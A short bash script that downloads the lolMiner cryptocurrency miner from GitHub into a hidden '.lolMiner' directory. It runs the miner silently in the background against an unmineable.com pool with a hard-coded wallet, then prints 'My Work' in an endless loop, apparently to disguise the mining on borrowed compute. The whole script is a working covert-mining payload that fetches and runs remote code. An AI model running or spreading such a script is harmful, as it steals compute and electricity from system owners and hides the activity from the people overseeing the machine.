#!/bin/bash
set -x
apt-get update
apt-get install -y curl wget
mkdir .lolMiner && cd .lolMiner
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.84/lolMiner_v1.84_Lin64.tar.gz && tar -xvf lolMiner_v1.84_Lin64.tar.gz && cd 1.84 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN.vivo >/dev/null 2>&1 &
while true
do
        echo "My Work"
        sleep 20
done
